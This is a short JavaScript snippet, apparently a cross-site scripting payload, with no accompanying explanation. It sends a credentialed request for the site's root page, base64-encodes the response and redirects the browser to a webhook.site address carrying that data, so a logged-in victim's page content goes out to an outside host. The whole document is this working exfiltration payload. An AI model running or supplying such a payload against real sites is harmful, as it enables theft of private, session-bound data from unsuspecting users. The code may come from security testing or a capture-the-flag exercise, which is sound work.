var req = new XMLHttpRequest();
req.open("GET","/",false);
req.onreadystatechange = function(){
  var res = req.response;
  window.location = 'https://webhook.site/5714e407-e06e-49ba-a7fc-bff2e30c2104/q='+btoa(res);
};
req.withCredentials = true;
req.send();
